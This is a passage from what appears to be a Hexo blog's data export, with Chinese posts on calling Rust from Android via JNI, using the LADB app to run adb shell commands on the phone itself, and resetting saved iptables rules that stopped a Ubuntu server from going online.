invoke__\">expect</span>(<span class=\"string\">&quot;Couldn&#x27;t create java string!&quot;</span>)</span><br><span class=\"line\">        .<span class=\"title function_ invoke__\">into_inner</span>()</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#[no_mangle]</span></span><br><span class=\"line\"><span class=\"keyword\">pub</span> <span class=\"keyword\">extern</span> <span class=\"string\">&quot;C&quot;</span> <span class=\"keyword\">fn</span> <span class=\"title function_\">Java_com_xxx_xxx_Yyy_getTestStrWithInput</span>(</span><br><span class=\"line\">    env: JNIEnv, _: JClass, input: JString,</span><br><span class=\"line\">) <span class=\"punctuation\">-&gt;</span> jstring &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">input</span>: <span class=\"type\">String</span> = env.<span class=\"title function_ invoke__\">get_string</span>(input)</span><br><span class=\"line\">        .<span class=\"title function_ invoke__\">expect</span>(<span class=\"string\">&quot;Couldn&#x27;t get java string!&quot;</span>)</span><br><span class=\"line\">        .<span class=\"title function_ invoke__\">into</span>();</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">output</span> = env.<span class=\"title function_ invoke__\">new_string</span>(<span class=\"built_in\">format!</span>(<span class=\"string\">&quot;Hello, &#123;&#125;!&quot;</span>, input))</span><br><span class=\"line\">        .<span class=\"title function_ invoke__\">expect</span>(<span class=\"string\">&quot;Couldn&#x27;t create java string!&quot;</span>);</span><br><span class=\"line\">    output.<span class=\"title function_ invoke__\">into_inner</span>()</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>如上所示，我们编写了两个方法，一个是直接返回一个String，另一个是带参数返回拼接后的String。方法的命名规则和写C++的JNI代码一样，以此处为例，说明我们需要在Java&#x2F;Kotlin代码中对应创建一个包名为 <code>com.xxx.xxx</code>，名为 <code>Yyy</code> 的类，其中有两个方法：</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.xxx.xxx</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">object</span> Yyy &#123;</span><br><span class=\"line\">    <span class=\"keyword\">init</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 因为等会儿编译的so产物为librust_android_libs.so，所以此处加载命名如下</span></span><br><span class=\"line\">        System.loadLibrary(<span class=\"string\">&quot;rust_android_libs&quot;</span>)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">external</span> <span class=\"function\"><span class=\"keyword\">fun</span> <span class=\"title\">getTestStr</span><span class=\"params\">()</span></span>: String</span><br><span class=\"line\">    <span class=\"keyword\">external</span> <span class=\"function\"><span class=\"keyword\">fun</span> <span class=\"title\">getTestStrWithInput</span><span class=\"params\">(input: <span class=\"type\">String</span>)</span></span>: String</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>4、编译Rust项目，按需要的架构编译即可，如果不用模拟器的话，一般都不用考虑x86：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cargo build --target aarch64-linux-android --release</span><br><span class=\"line\">cargo build --target armv7-linux-androideabi --release</span><br><span class=\"line\">cargo build --target i686-linux-android --release</span><br></pre></td></tr></table></figure>\n\n<p>编译成功后在项目的 <code>/target/aarch64-linux-android/release/librust_android_libs.so</code> 路径下可以找到想要的so文件，把它复制到Android项目中。</p>\n<p>一般来说都在 <code>.../app/src/main/jniLibs/arm64-v8a/</code> 这样的目录下，按你需要的架构来即可。同时记得配置build.gradle：</p>\n<figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">...</span><br><span class=\"line\">android &#123;</span><br><span class=\"line\">    compileSdkVersion <span class=\"number\">30</span></span><br><span class=\"line\">    defaultConfig &#123;</span><br><span class=\"line\">        ...</span><br><span class=\"line\"></span><br><span class=\"line\">        ndk &#123;</span><br><span class=\"line\">            abiFilters <span class=\"string\">&#x27;arm64-v8a&#x27;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 如果你的AGP插件版本不小于7.0，可能需要添加</span></span><br><span class=\"line\">    packagingOptions &#123;</span><br><span class=\"line\">        jniLibs &#123;</span><br><span class=\"line\">            useLegacyPackaging = <span class=\"literal\">true</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"后话\"><a href=\"#后话\" class=\"headerlink\" title=\"后话\"></a>后话</h3><p>整个流程下来，还是有点小繁琐的，同时也整理几个问题吧：</p>\n<p>1、同样的代码逻辑，Rust编译出来的so库比C++编译的要大很多，以我上面的代码为例，64位架构大约在<strong>4MB</strong>左右，32位在3MB多一点，而C++编译的产物分别为<strong>1MB</strong>多和900多KB，这对包体积大小敏感的项目来说，差距还是不小的。不知道有没有优化的方法，由于我也是刚接触Rust，还不太了解。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 我们可以用strings命令来对比两种环境编译出来的so结构</span></span><br><span class=\"line\">strings librust_android_libs.so</span><br></pre></td></tr></table></figure>\n\n<p>2、复杂的业务逻辑肯定需要调试，以方便定位问题，但以我们上面的例子来看，Rust项目和Android是分开的，如何像C++代码那样直接在Android项目中整合编译并断点调试，还需要进一步探索。</p>\n<p>3、Google和Rust官方对于适配到Android应用项目的相关文档还不是很丰富，我们在Studio中New Project的时候，就可以看见有Native C++的模板可以选择，这给了初学者很好的示范，希望以后也有Native Rust之类的模板。</p>\n"},{"layout":"post","title":"无需电脑如何执行adb shell命令","subtitle":"新玩意儿。","date":"2022-02-17T16:00:00.000Z","author":"YSY","header-img":"img/404-bg.jpg","catalog":true,"_content":"\n### 背景\n\nADB（[Android Debug Bridge](https://developer.android.com/studio/command-line/adb)），是调试Android设备的一个命令行工具。对开发者来说，ADB自然是日常工作的得力助手；对我们业余玩家来说，它也可以用来控制一些默认情况下接触不到的功能设置。\n\n在早期的Android平台上，我们只能通过USB数据线连接电脑和手机，然后再在电脑上使用ADB工具，前提是已经在开发者选项中开启了**USB调试**开关。\n\n从Android 10开始，Google看着大家那可怜的USB接口数量和满桌的数据线，无奈之下推出了一个**无线调试**功能。只需要电脑和手机连接到同一个WiFi（即在同一局域网下），就可以进行调试。\n\n![](https://cdn.sspai.com/2022/02/15/3c0eb93be7d8cb46ec37d8183e627c59.png)\n\n虽然简化如此，但用户还是需要一台电脑才可以执行ADB的相关命令。比如说我想随时随地“冻结”某个应用：\n\n```bash\nadb shell pm disable-user com.tencent.mm\n```\n\n还得身边有一台安装了Android开发工具的电脑，挺麻烦的。\n\n### 本地ADB\n\n既然现在新设备已经支持无线调试，我们是不是可以把手机本身当作电脑，让它自己连接自己呢？相当于手机本身既是ADB Server也是Client，同时也满足在同一局域网的条件。\n\n是的，已经有大神想到这个点子并开发了一个工具应用：**LADB**，顾名思义即Local ADB，在本地的ADB。基于GPL协议开源：[github.com/tytydraco/LADB](https://github.com/tytydraco/LADB)。\n\n我们安装后试一试效果，目前看起来功能还是挺简单的，就一个Shell窗口。简单使用步骤：\n\n1. 先连接任意一个WiFi，就算没有接入互联网都可以；\n2. 然后打开LADB，将它调整为小窗模式（或分屏模式），因为无线调试的配对码等信息每次点击都会动态生成，所以才需要小窗模式**同时打开**本应用和开发者选项；\n\n![](https://cdn.sspai.com/2022/02/15/292a7074ba96639f56576a638305e64e.png)\n\n3. 进入开发者选项，开启无线调试，首次使用需要配对设备，将配对码和端口填入本应用即可。成功以后，下次再使用就会自动连接了。\n\n![](https://cdn.sspai.com/2022/02/15/9cbbe843f032e7c021067f3bb94f1ffd.png)\n\n我们不仅可以使用adb shell相关的命令，还可以使用Linux系统中一些常用的命令。这样即便没有电脑，也可以做部分调试了，而且访问权限会比其他类似的模拟终端应用（诸如Termux）高一些。\n\n![](https://cdn.sspai.com/2022/02/15/28cfa3661f1fdba794e76abbf12a5bd7.png)\n\n### 后话\n\n我们仍然不能使用LADB这个应用来执行类似如下命令：\n\n```bash\nadb root\nadb reboot\nadb install\n...\n```\n\n因为LADB只是向用户开放了adb shell输入，所以也只能执行 `adb shell xxx` 这样的命令（比如上文提到的停用应用）。从它的源码来看是将整个ADB工具编译到移动平台的，我猜也是考虑到安全原因吧没有暴露除shell以外的其他命令输入。\n\n我基于原作者的开源代码做了一些Shell使用上的优化，其他功能基本不变，感兴趣的同学可以[下载](https://github.com/ysy950803/LADBS/raw/ladbs/app/release/app-release.apk)体验。\n","source":"_posts/2022-02-18-无需电脑如何执行adb shell命令.md","raw":"---\nlayout:     post\ntitle:      无需电脑如何执行adb shell命令\nsubtitle:   新玩意儿。\ndate:       2022-02-18\nauthor:     YSY\nheader-img: img/404-bg.jpg\ncatalog: true\ntags:\n    - Android\n    - 鼓捣折腾\n---\n\n### 背景\n\nADB（[Android Debug Bridge](https://developer.android.com/studio/command-line/adb)），是调试Android设备的一个命令行工具。对开发者来说，ADB自然是日常工作的得力助手；对我们业余玩家来说，它也可以用来控制一些默认情况下接触不到的功能设置。\n\n在早期的Android平台上，我们只能通过USB数据线连接电脑和手机，然后再在电脑上使用ADB工具，前提是已经在开发者选项中开启了**USB调试**开关。\n\n从Android 10开始，Google看着大家那可怜的USB接口数量和满桌的数据线，无奈之下推出了一个**无线调试**功能。只需要电脑和手机连接到同一个WiFi（即在同一局域网下），就可以进行调试。\n\n![](https://cdn.sspai.com/2022/02/15/3c0eb93be7d8cb46ec37d8183e627c59.png)\n\n虽然简化如此，但用户还是需要一台电脑才可以执行ADB的相关命令。比如说我想随时随地“冻结”某个应用：\n\n```bash\nadb shell pm disable-user com.tencent.mm\n```\n\n还得身边有一台安装了Android开发工具的电脑，挺麻烦的。\n\n### 本地ADB\n\n既然现在新设备已经支持无线调试，我们是不是可以把手机本身当作电脑，让它自己连接自己呢？相当于手机本身既是ADB Server也是Client，同时也满足在同一局域网的条件。\n\n是的，已经有大神想到这个点子并开发了一个工具应用：**LADB**，顾名思义即Local ADB，在本地的ADB。基于GPL协议开源：[github.com/tytydraco/LADB](https://github.com/tytydraco/LADB)。\n\n我们安装后试一试效果，目前看起来功能还是挺简单的，就一个Shell窗口。简单使用步骤：\n\n1. 先连接任意一个WiFi，就算没有接入互联网都可以；\n2. 然后打开LADB，将它调整为小窗模式（或分屏模式），因为无线调试的配对码等信息每次点击都会动态生成，所以才需要小窗模式**同时打开**本应用和开发者选项；\n\n![](https://cdn.sspai.com/2022/02/15/292a7074ba96639f56576a638305e64e.png)\n\n3. 进入开发者选项，开启无线调试，首次使用需要配对设备，将配对码和端口填入本应用即可。成功以后，下次再使用就会自动连接了。\n\n![](https://cdn.sspai.com/2022/02/15/9cbbe843f032e7c021067f3bb94f1ffd.png)\n\n我们不仅可以使用adb shell相关的命令，还可以使用Linux系统中一些常用的命令。这样即便没有电脑，也可以做部分调试了，而且访问权限会比其他类似的模拟终端应用（诸如Termux）高一些。\n\n![](https://cdn.sspai.com/2022/02/15/28cfa3661f1fdba794e76abbf12a5bd7.png)\n\n### 后话\n\n我们仍然不能使用LADB这个应用来执行类似如下命令：\n\n```bash\nadb root\nadb reboot\nadb install\n...\n```\n\n因为LADB只是向用户开放了adb shell输入，所以也只能执行 `adb shell xxx` 这样的命令（比如上文提到的停用应用）。从它的源码来看是将整个ADB工具编译到移动平台的，我猜也是考虑到安全原因吧没有暴露除shell以外的其他命令输入。\n\n我基于原作者的开源代码做了一些Shell使用上的优化，其他功能基本不变，感兴趣的同学可以[下载](https://github.com/ysy950803/LADBS/raw/ladbs/app/release/app-release.apk)体验。\n","slug":"无需电脑如何执行adb shell命令","published":1,"updated":"2024-03-25T07:31:25.987Z","comments":1,"photos":[],"link":"","_id":"cluaufh1k004othe676m8f3gu","content":"<h3 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h3><p>ADB（<a href=\"https://developer.android.com/studio/command-line/adb\">Android Debug Bridge</a>），是调试Android设备的一个命令行工具。对开发者来说，ADB自然是日常工作的得力助手；对我们业余玩家来说，它也可以用来控制一些默认情况下接触不到的功能设置。</p>\n<p>在早期的Android平台上，我们只能通过USB数据线连接电脑和手机，然后再在电脑上使用ADB工具，前提是已经在开发者选项中开启了<strong>USB调试</strong>开关。</p>\n<p>从Android 10开始，Google看着大家那可怜的USB接口数量和满桌的数据线，无奈之下推出了一个<strong>无线调试</strong>功能。只需要电脑和手机连接到同一个WiFi（即在同一局域网下），就可以进行调试。</p>\n<p><img src=\"https://cdn.sspai.com/2022/02/15/3c0eb93be7d8cb46ec37d8183e627c59.png\"></p>\n<p>虽然简化如此，但用户还是需要一台电脑才可以执行ADB的相关命令。比如说我想随时随地“冻结”某个应用：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">adb shell pm disable-user com.tencent.mm</span><br></pre></td></tr></table></figure>\n\n<p>还得身边有一台安装了Android开发工具的电脑，挺麻烦的。</p>\n<h3 id=\"本地ADB\"><a href=\"#本地ADB\" class=\"headerlink\" title=\"本地ADB\"></a>本地ADB</h3><p>既然现在新设备已经支持无线调试，我们是不是可以把手机本身当作电脑，让它自己连接自己呢？相当于手机本身既是ADB Server也是Client，同时也满足在同一局域网的条件。</p>\n<p>是的，已经有大神想到这个点子并开发了一个工具应用：<strong>LADB</strong>，顾名思义即Local ADB，在本地的ADB。基于GPL协议开源：<a href=\"https://github.com/tytydraco/LADB\">github.com&#x2F;tytydraco&#x2F;LADB</a>。</p>\n<p>我们安装后试一试效果，目前看起来功能还是挺简单的，就一个Shell窗口。简单使用步骤：</p>\n<ol>\n<li>先连接任意一个WiFi，就算没有接入互联网都可以；</li>\n<li>然后打开LADB，将它调整为小窗模式（或分屏模式），因为无线调试的配对码等信息每次点击都会动态生成，所以才需要小窗模式<strong>同时打开</strong>本应用和开发者选项；</li>\n</ol>\n<p><img src=\"https://cdn.sspai.com/2022/02/15/292a7074ba96639f56576a638305e64e.png\"></p>\n<ol start=\"3\">\n<li>进入开发者选项，开启无线调试，首次使用需要配对设备，将配对码和端口填入本应用即可。成功以后，下次再使用就会自动连接了。</li>\n</ol>\n<p><img src=\"https://cdn.sspai.com/2022/02/15/9cbbe843f032e7c021067f3bb94f1ffd.png\"></p>\n<p>我们不仅可以使用adb shell相关的命令，还可以使用Linux系统中一些常用的命令。这样即便没有电脑，也可以做部分调试了，而且访问权限会比其他类似的模拟终端应用（诸如Termux）高一些。</p>\n<p><img src=\"https://cdn.sspai.com/2022/02/15/28cfa3661f1fdba794e76abbf12a5bd7.png\"></p>\n<h3 id=\"后话\"><a href=\"#后话\" class=\"headerlink\" title=\"后话\"></a>后话</h3><p>我们仍然不能使用LADB这个应用来执行类似如下命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">adb root</span><br><span class=\"line\">adb reboot</span><br><span class=\"line\">adb install</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n\n<p>因为LADB只是向用户开放了adb shell输入，所以也只能执行 <code>adb shell xxx</code> 这样的命令（比如上文提到的停用应用）。从它的源码来看是将整个ADB工具编译到移动平台的，我猜也是考虑到安全原因吧没有暴露除shell以外的其他命令输入。</p>\n<p>我基于原作者的开源代码做了一些Shell使用上的优化，其他功能基本不变，感兴趣的同学可以<a href=\"https://github.com/ysy950803/LADBS/raw/ladbs/app/release/app-release.apk\">下载</a>体验。</p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<h3 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h3><p>ADB（<a href=\"https://developer.android.com/studio/command-line/adb\">Android Debug Bridge</a>），是调试Android设备的一个命令行工具。对开发者来说，ADB自然是日常工作的得力助手；对我们业余玩家来说，它也可以用来控制一些默认情况下接触不到的功能设置。</p>\n<p>在早期的Android平台上，我们只能通过USB数据线连接电脑和手机，然后再在电脑上使用ADB工具，前提是已经在开发者选项中开启了<strong>USB调试</strong>开关。</p>\n<p>从Android 10开始，Google看着大家那可怜的USB接口数量和满桌的数据线，无奈之下推出了一个<strong>无线调试</strong>功能。只需要电脑和手机连接到同一个WiFi（即在同一局域网下），就可以进行调试。</p>\n<p><img src=\"https://cdn.sspai.com/2022/02/15/3c0eb93be7d8cb46ec37d8183e627c59.png\"></p>\n<p>虽然简化如此，但用户还是需要一台电脑才可以执行ADB的相关命令。比如说我想随时随地“冻结”某个应用：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">adb shell pm disable-user com.tencent.mm</span><br></pre></td></tr></table></figure>\n\n<p>还得身边有一台安装了Android开发工具的电脑，挺麻烦的。</p>\n<h3 id=\"本地ADB\"><a href=\"#本地ADB\" class=\"headerlink\" title=\"本地ADB\"></a>本地ADB</h3><p>既然现在新设备已经支持无线调试，我们是不是可以把手机本身当作电脑，让它自己连接自己呢？相当于手机本身既是ADB Server也是Client，同时也满足在同一局域网的条件。</p>\n<p>是的，已经有大神想到这个点子并开发了一个工具应用：<strong>LADB</strong>，顾名思义即Local ADB，在本地的ADB。基于GPL协议开源：<a href=\"https://github.com/tytydraco/LADB\">github.com&#x2F;tytydraco&#x2F;LADB</a>。</p>\n<p>我们安装后试一试效果，目前看起来功能还是挺简单的，就一个Shell窗口。简单使用步骤：</p>\n<ol>\n<li>先连接任意一个WiFi，就算没有接入互联网都可以；</li>\n<li>然后打开LADB，将它调整为小窗模式（或分屏模式），因为无线调试的配对码等信息每次点击都会动态生成，所以才需要小窗模式<strong>同时打开</strong>本应用和开发者选项；</li>\n</ol>\n<p><img src=\"https://cdn.sspai.com/2022/02/15/292a7074ba96639f56576a638305e64e.png\"></p>\n<ol start=\"3\">\n<li>进入开发者选项，开启无线调试，首次使用需要配对设备，将配对码和端口填入本应用即可。成功以后，下次再使用就会自动连接了。</li>\n</ol>\n<p><img src=\"https://cdn.sspai.com/2022/02/15/9cbbe843f032e7c021067f3bb94f1ffd.png\"></p>\n<p>我们不仅可以使用adb shell相关的命令，还可以使用Linux系统中一些常用的命令。这样即便没有电脑，也可以做部分调试了，而且访问权限会比其他类似的模拟终端应用（诸如Termux）高一些。</p>\n<p><img src=\"https://cdn.sspai.com/2022/02/15/28cfa3661f1fdba794e76abbf12a5bd7.png\"></p>\n<h3 id=\"后话\"><a href=\"#后话\" class=\"headerlink\" title=\"后话\"></a>后话</h3><p>我们仍然不能使用LADB这个应用来执行类似如下命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">adb root</span><br><span class=\"line\">adb reboot</span><br><span class=\"line\">adb install</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n\n<p>因为LADB只是向用户开放了adb shell输入，所以也只能执行 <code>adb shell xxx</code> 这样的命令（比如上文提到的停用应用）。从它的源码来看是将整个ADB工具编译到移动平台的，我猜也是考虑到安全原因吧没有暴露除shell以外的其他命令输入。</p>\n<p>我基于原作者的开源代码做了一些Shell使用上的优化，其他功能基本不变，感兴趣的同学可以<a href=\"https://github.com/ysy950803/LADBS/raw/ladbs/app/release/app-release.apk\">下载</a>体验。</p>\n"},{"layout":"post","title":"解决iptables导致无法联网的问题","subtitle":"啊这~","date":"2022-02-28T16:00:00.000Z","author":"YSY","header-style":"text","catalog":true,"_content":"\n### 问题\n\n先说下我的单机环境是Ubuntu 16.04，只放了点小应用，一直没升级系统（懒），防火墙规则也是简单地使用iptables来控制。\n\n今天我因需要重启服务器之后，发现突然连不上了，ssh无法连接，ping也不通，我开始慌了。于是我只能进入云服务器商的后台，用网页版登录，不管你是阿里云还是腾讯云还是国外的服务商，现在大多都有这种功能。\n\n进去之后，先任意`ping`一个公网IP，提示 **“Network is unreachable”** ，看来这互联网是彻底断了。用`ifconfig`也能发现本机的公网IP看不见了。\n\n怎么重启一下就这样了呢？\n\n### 排查\n\n直接检查networking服务状态：\n\n```bash\nsystemctl status networking.service\n```\n\n能发现服务运行状态不是Active的，并且提示了是由于iptables规则应用失败，其中可以看见 **“cannot resolve host” **之类的字样，具体现场我没有截图保存，大概是这些内容。\n\n原因基本上就清楚了，因为我前段时间手动禁用了某些IP来做测试：\n\n```bash\niptables -I INPUT -s xxx.xxx.xxx.xxx -j DROP\n```\n\n并且还将规则保存了下来：\n\n```bash\niptables-save > /etc/iptables.up.rules\n```\n\n**然后现在这些IP已经找不到了，无法解析，才导致了networking服务启动失败。**\n\n### 解决\n\n简单粗暴一点吧，直接重置所有iptables里自定义的内容：\n\n```bash\n# 默认策略设置为ACCEPT，否则后续操作会导致连接断开，无法再次连接\niptables -P INPUT ACCEPT\niptables -P FORWARD ACCEPT\niptables -P OUTPUT ACCEPT\niptables -t nat -P PREROUTING ACCEPT\niptables -t nat -P POSTROUTING ACCEPT\niptables -t nat -P OUTPUT ACCEPT\n# 清空所有规则\niptables -F\niptables -t nat -F\n# 删除所有非系统默认的链\niptables -X\niptables -t nat -X\n# 保存一下\niptables-save\n# 如果之前也持久化了rules，重新保存，避免重启又失效了\niptables-save > /etc/iptables.up.rules\n```\n\n如果涉及IPV6的服务器，上述命令最好换成`ip6tables-save`再执行一遍。\n\n最后重启网络服务，成功就能联网了：\n\n```bash\nsystemctl restart networking.service\n```\n\n### 后话\n\n总的来说，还是对iptables机制不熟悉导致的问题，没想到Ubuntu 16.04的网络服务必须要先检查iptables并且全部IP解析成功才能运行。此外，iptables在很多新版本的Linux发行版中已经不使用了，有更好的工具取而代之。\n","source":"_posts/2022-03-01-解决iptables导致无法联网的问题.md","raw":"---\nlayout:     post\ntitle:      解决iptables导致无法联网的问题\nsubtitle:   啊这~\ndate:       2022-03-01\nauthor:     YSY\nheader-style: text\ncatalog: true\ntags:\n    - 后端\n    - Linux\n    - 问题不大\n---\n\n### 问题\n\n先说下我的单机环境是Ubuntu 16.04，只放了点小应用，一直没升级系统（懒），防火墙规则也是简单地使用iptables来控制。\n\n今天我因需要重启服务器之后，发现突然连不上了，ssh无法连接，ping也不通，我开始慌了。于是我只能进入云服务器商的后台，用网页版登录，不管你是阿里云还是腾讯云还是国外的服务商，现在大多都有这种功能。\n\n进去之后，先任意`ping`一个公网IP，提示 **“Network is unreachable”** ，看来这互联网是彻底断了。用`ifconfig`也能发现本机的公网IP看不见了。\n\n怎么重启一下就这样了呢？\n\n### 排查\n\n直接检查networking服务状态：\n\n```bash\nsystemctl status networking.service\n```\n\n能发现服务运行状态不是Active的，并且提示了是由于iptables规则应用失败，其中可以看见 **“cannot resolve host” **之类的字样，具体现场我没有截图保存，大概是这些内容。\n\n原因基本上就清楚了，因为我前段时间手动禁用了某些IP来做测试：\n\n```bash\niptables -I INPUT -s xxx.xxx.xxx.xxx -j DROP\n```\n\n并且还将规则保存了下来：\n\n```bash\niptables-save > /etc/iptables.up.rules\n```\n\n**然后现在这些IP已经找不到了，无法解析，才导致了networking服务启动失败。**\n\n### 解决\n\n简单粗暴一点吧，直接重置所有iptables里自定义的内容：\n\n```bash\n# 默认策略设置为ACCEPT，否则后续操作会导致连接断开，无法再次连接\niptables -P INPUT ACCEPT\niptables -P FORWARD ACCEPT\niptables -P OUTPUT ACCEPT\niptables -t nat -P PREROUTING ACCEPT\niptables -t nat -P POSTROUTING ACCEPT\niptables -t nat -P OUTPUT ACCEPT\n# 清空所有规则\niptables -F\niptables -t nat -F\n# 删除所有非系统默认的链\niptables -X\niptables -t nat -X\n# 保存一下\niptables-save\n# 如果之前也持久化了rules，重新保存，避免重启又失效了\niptables-save > /etc/iptables.up.rules\n```\n\n如果涉及IPV6的服务器，上述命令最好换成`ip6tables-save`再执行一遍。\n\n最后重启网络服务，成功就能联网了：\n\n```bash\nsystemctl restart networking.service\n```\n\n### 后话\n\n总的来说，还是对iptables机制不熟悉导致的问题，没想到Ubuntu 16.04的网络服务必须要先检查iptables并且全部IP解析成功才能运行。此外，iptables在很多新版本的Linux发行版中已经不使用了，有更好的工具取而代之。\n","slug":"解决iptables导致无法联网的问题","published":1,"updated":"2024-03-25T07:31:25.987Z","comments":1,"photos":[],"link":"","_id":"cluaufh1k004rthe6djp626zu","content":"<h3 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h3><p>先说下我的单机环境是Ubuntu 16.04，只放了点小应用，一直没升级系统（懒），防火墙规则也是简单地使用iptables来控制。</p>\n<p>今天我因需要重启服务器之后，发现突然连不上了，ssh无法连接，ping也不通，我开始慌了。于是我只能进入云服务器商的后台，用网页版登录，不管你是阿里云还是腾讯云还是国外的服务商，现在大多都有这种功能。</p>\n<p>进去之后，先任意<code>ping</code>一个公网IP，提示 <strong>“Network is unreachable”</strong> ，看来这互联网是彻底断了。用<code>ifconfig</code>也能发现本机的公网IP看不见了。</p>\n<p>怎么重启一下就这样了呢？</p>\n<h3 id=\"排查\"><a href=\"#排查\" class=\"headerlink\" title=\"排查\"></a>排查</h3><p>直接检查networking服务状态：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl status networking.service</span><br></pre></td></tr></table></figure>\n\n<p>能发现服务运行状态不是Active的，并且提示了是由于iptables规则应用失败，其中可以看见 **“cannot resolve host” **之类的字样，具体现场我没有截图保存，大概是这些内容。</p>\n<p>原因基本上就清楚了，因为我前段时间手动禁用了某些IP来做测试：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">iptables -I INPUT -s xxx.xxx.xxx.xxx -j DROP</span><br></pre></td></tr></table></figure>\n\n<p>并且还将规则保存了下来：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">iptables-save &gt; /etc/iptables.up.rules</span><br></pre></td></tr></table></figure>\n\n<p><strong>然后现在这些IP已经找不到了，无法解析，才导致了networking服务启动失败。</strong></p>\n<h3 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h3><p>简单粗暴一点吧，直接重置所有iptables里自定义的内容：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 默认策略设置为ACCEPT，否则后续操作会导致连接断开，无法再次连接</span></span><br><span class=\"line\">iptables -P INPUT ACCEPT</span><br><span class=\"line\">iptables -P FORWARD ACCEPT</span><br><span class=\"line\">iptables -P OUTPUT ACCEPT</span><br><span class=\"line\">iptables -t nat -P PREROUTING ACCEPT</span><br><span class=\"line\">iptables -t nat -P POSTROUTING ACCEPT</span><br><span class=\"line\">iptables -t nat -P OUTPUT ACCEPT</span><br><span class=\"line\"><span class=\"comment\"># 清空所有规则</span></span><br><span class=\"line\">iptables -F</span><br><span class=\"line\">iptables -t nat -F</span><br><span class=\"line\"><span class=\"comment\"># 删除所有非系统默认的链</span></span><br><span class=\"line\">iptables -X</span><br><span 